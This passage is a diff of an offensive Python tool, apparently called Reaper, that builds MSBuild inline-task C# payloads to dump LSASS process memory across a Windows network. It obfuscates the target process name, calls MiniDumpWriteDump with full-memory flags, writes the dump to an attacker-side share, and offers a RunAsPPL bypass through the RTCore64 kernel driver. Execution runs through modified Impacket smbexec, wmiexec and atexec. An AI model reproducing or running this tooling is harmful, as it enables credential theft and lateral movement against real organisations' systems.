     xml_payload += "                string filePath = \"%s:\\\\\" + System.Net.Dns.GetHostName() + %s + \".dmp\";\n" % (drive_letter, thismachinesip)
-
-    xml_payload += "                string %s = \"s\";\n" % (s)
-    xml_payload += "                string %s = \"l\";\n" % (l)
-    xml_payload += "                string %s = \"a\";\n" % (a)
-
-    xml_payload += "                int %s = 0;\n" % (id)
-    xml_payload += "                var %s = Process.GetProcessesByName(%s + %s + %s + %s + %s);\n" % (processes, l, s, a, s, s)
-    xml_payload += "                foreach(var %s in %s)\n" % (p, processes)
-    xml_payload += "                {\n"
-    xml_payload += "                    %s = %s.Id;\n" % (id, p)
-    xml_payload += "                }\n"
-    xml_payload += "                int %s = getthatdmp(%s, filePath);\n" % (returnedout, id)
+    xml_payload += "                Process %s = Process.GetProcessById(%s());\n" % (p, GetPID)
+    xml_payload += "                %s(filePath, (Typ.%s | Typ.%s | Typ.%s | Typ.%s | Typ.%s), %s.Handle, (uint)%s.Id);\n" % (Dump, MiniDumpWithFullMemory, MiniDumpWithDataSegs, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, p, p)
     if runasppl:
         xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"net stop RTCore64\").WaitForExit();\n"
         xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"sc.exe delete RTCore64\").WaitForExit();\n"
@@ -979,9 +1322,6 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
         for addr in addresses_array:
             f.write(addr + "\n")
         f.close()
-
-    os.system('sudo cp {}/src/minidump /var/tmp/{}/{}.dll'.format(cwd, share_name, minidumpdll))
-    os.system('sudo chmod uog+rx /var/tmp/{}/{}.dll'.format(share_name, minidumpdll))
 
     if runasppl:
         os.system('sudo cp {}/src/runasppldll /var/tmp/{}/{}.dll'.format(cwd, share_name, RunAsPPLDll))
@@ -1354,7 +1694,7 @@ if __name__ == '__main__':
         os.system('sudo rm {}/indivlog.txt'.format(cwd))
 
     printnlog(reaper_banner)
-    #update_chk()
+    update_chk()
     printnlog(version.BANNER)
 
     parser = argparse.ArgumentParser(add_help=True, description='', epilog='Methods:\n smbexec: Impacket\'s smbexec that has been modified to work a little better it is the most consistent and clean working\n wmiexec: Impacket\'s wmiexec that has been modified to work with Reaper the only artifact it leaves is a dead SMB connection if the payload does not fully execute\n atexec:  Impacket\'s atexec it works sometimes\n\nPayloads:\n  msbuild:     Abuses MsBuild v4.0+\'s ability to run inline tasks via an xml payload to execute C# code\n  regsvr32:    Abuses RegSvr32\'s ability to execute a dll to execute code\n  dllsideload: Abuses Windows 7 calc.exe to sideload a dll to gain code execution\n  exe:         Pretty self explanatory it\'s an exe that runs', formatter_class=RawTextHelpFormatter)
@@ -1371,8 +1711,8 @@ if __name__ == '__main__':
     parser.add_argument('-threads', action='store', type=int, default=5, help='Set the maximum number of threads default=5')
     parser.add_argument('-timeout', action='store', type=int, default=90, help='Set the timeout in seconds for each thread default=90')
     parser.add_argument('-method', action='store', default='smbexec', choices=['wmiexec', 'atexec', 'smbexec'], help='Choose a method to execute the commands')
-   # temp only allowing msbuild until I can fix the rest parser.add_argument('-payload', '-p', action='store', default='msbuild', choices=['msbuild', 'regsvr32', 'dllsideload', 'exe'], help='Choose a payload type')
-    parser.add_argument('-payload', '-p', action='store', default='msbuild', choices=['msbuild'], help='Choose a payload type')
+    #parser.add_argument('-payload', '-p', action='store', default='msbuild', choices=['msbuild', 'regsvr32', 'dllsideload', 'exe'], help='Choose a payload type')
+    parser.add_argument('-payload', '-p', action='store', default='exe', choices=['exe'], help='Choose a payload type')
     parser.add_argument('-payloadname', action='store', help='Set the name for the payload file Default=random')
     parser.add_argument('-ip', action='store', help='Your local ip or network interface for the remote device to connect to')
     parser.add_argument('-runasppl', action='store_true', default=False, help='Attempts to bypass RunAsPPL (WARNING THIS USES A SYSTEM DRIVER AND INTERACTS AT A KERNEL LEVEL DO NOT USE IN PROD)')
@@ -1590,7 +1930,7 @@ if __name__ == '__main__':
         elif options.payload == 'regsvr32':
             addresses_file = gen_payload_regsvr32(share_name, payload_name, addresses)
         elif options.payload == 'exe':
-            gen_payload_exe(share_name, payload_name, addresses)
+            gen_payload_exe(share_name, payload_name, addresses, drive_letter)
         elif options.payload == 'dllsideload':
             gen_payload_dllsideload(share_name, addresses)
 
